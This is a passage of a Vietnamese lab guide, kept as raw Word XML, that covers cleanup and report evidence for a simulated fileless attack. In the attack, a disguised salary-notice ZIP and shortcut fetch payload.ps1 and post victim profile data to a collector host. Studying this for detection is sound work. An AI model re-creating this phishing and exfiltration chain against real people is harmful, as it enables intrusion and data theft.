        </w:rPr>
        <w:t xml:space="preserve">, Sysmon Event ID 3 cho kết nối từ PowerShell đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> và </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>192.168.141.1:8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, PowerShell Event ID 4104 cho nội dung script được xử lý, request </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên collector, và việc không xuất hiện file payload trên victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
        <w:spacing w:before="0"/>
      </w:pPr>
      <w:r>
        <w:t>04 - Cleanup và viết báo cáo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>1. Cleanup sau lab</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chỉ cleanup sau khi đã chụp screenshot và export log cần thiết.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.1. Xóa file tải về trên victim</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên victim, mở PowerShell:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "FilelessLabDemo" -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-Item -Path "$env:TEMP\FilelessLab" -Recurse -Force -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-Item -Path "$env:USERPROFILE\Downloads\ThongBaoLuong_Q3.zip" -Force -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-Item -Path "$env:USERPROFILE\Downloads\ThongBaoLuong_Q3" -Recurse -Force -ErrorAction SilentlyContinue</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-Item -Path "$env:USERPROFILE\Downloads\ThongBaoLuong_Q3.lnk" -Force -ErrorAction SilentlyContinue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nếu bạn giải nén ZIP ra Desktop hoặc thư mục khác, xóa thêm thư mục đó.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.2. Dừng các server trên attacker</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ở hai cửa sổ đang chạy:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>python -m http.server 8000 --bind 192.168.141.1</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>python .\collect_server.py</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nhấn:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Ctrl + C</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.3. Xóa thư mục lab trên attacker nếu muốn</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trên attacker:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Remove-Item -Path C:\Fileless-Lab -Recurse -Force</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Chỉ chạy lệnh này sau khi đã lưu lại screenshot, ZIP, LNK hoặc log cần dùng cho báo cáo.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>1.4. Khôi phục bằng snapshot</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Cách sạch nhất với victim:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Tắt VM.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Revert về snapshot trước lab.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>2. Export log để đưa vào báo cáo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.1. Export Sysmon log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong Event Viewer:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Applications and Services Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Microsoft</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      Sysmon</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Operational</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Click:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Save All Events As...</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Gợi ý lưu:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>C:\Users\&lt;user&gt;\Desktop\sysmon-operational.evtx</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.2. Export PowerShell log</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong Event Viewer:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Applications and Services Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Microsoft</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    Windows</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">      PowerShell</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">        Operational</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Filter:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>4104</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Sau đó lưu các event liên quan.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>2.3. Export Security log nếu có</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Trong Event Viewer:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Windows Logs</w:t>
      </w:r>
      <w:r>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Filter Event ID:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="60" w:after="120"/>
        <w:ind w:left="259"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>4688</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Lưu các event liên quan đến </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>powershell.exe</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>3. Ảnh cần đưa vào báo cáo</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Nên có tối thiểu:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ảnh mô hình 2 máy hoặc bảng IP attacker/victim.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh thư mục </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>C:\Fileless-Lab</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên attacker có </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh static server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8000</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> đang host ZIP/payload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh collector server port </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>8001</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> đang nhận </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>/collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh victim truy cập </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>http://192.168.141.1:8000/</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh victim tải </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh victim giải nén và thấy </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>ThongBaoLuong_Q3.lnk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>Ảnh victim không thấy popup/success rõ ràng sau khi mở LNK.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh static server có request </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /ThongBaoLuong_Q3.zip</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh static server có request </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>GET /payload.ps1</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh collector server có request </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>POST /collect</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
        <w:spacing w:after="100"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve">Ảnh file </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="Consolas"/>
          <w:sz w:val="19"/>
        </w:rPr>
        <w:t>collections\victim-profile-*.json</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman"/>
        </w:rPr>
        <w:t xml:space="preserve"> trên attacker.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
